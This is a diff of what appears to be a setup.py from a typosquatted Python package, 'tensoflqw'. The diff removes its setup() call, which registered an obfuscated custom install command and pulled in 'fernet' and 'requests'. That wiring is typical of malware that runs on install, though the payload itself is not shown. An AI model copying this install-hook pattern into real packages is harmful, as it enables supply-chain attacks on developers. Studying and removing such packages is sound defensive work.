@@ -18,22 +18,5 @@ class ENXimcpRabNWBzxpcdMLSYLyOofHAvDJWSyORCJTegxjhIBvnXCQJNqsXgDGfybVAtDVKGkbeM
             install.run(self)
 
 
-setup(
-    name="tensoflqw",
-    version=VERSION,
-    author="xbBUPNMYXL",
-    author_email="nkEaSJape@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ENXimcpRabNWBzxpcdMLSYLyOofHAvDJWSyORCJTegxjhIBvnXCQJNqsXgDGfybVAtDVKGkbeMmAjODoWKjptyRitAnFHxEywklmrCTKPiYeQPFGQpPoOZkxTA,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 
